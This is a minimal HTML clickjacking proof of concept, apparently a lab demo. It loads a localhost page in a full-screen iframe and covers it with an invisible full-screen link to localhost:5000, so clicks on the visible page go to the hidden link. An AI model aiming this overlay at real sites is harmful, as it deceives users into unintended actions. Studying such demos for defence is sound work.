<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CLICK-JACKED</title>

    <style>
        *{
            margin: 0;
            padding: 0;
        }

        iframe{
            position: absolute;
            width: 100%;
            height: 100vh;
        }

        .over{
            position: absolute;
            top: 0;
            z-index: 2;
            width: 100%;
            height: 100vh;
        }
    </style>
</head>

<body>
   <iframe src="http://localhost/" frameborder="0"></iframe>
    <a href="http://localhost:5000/" class="over"></a>
</body>

</html>
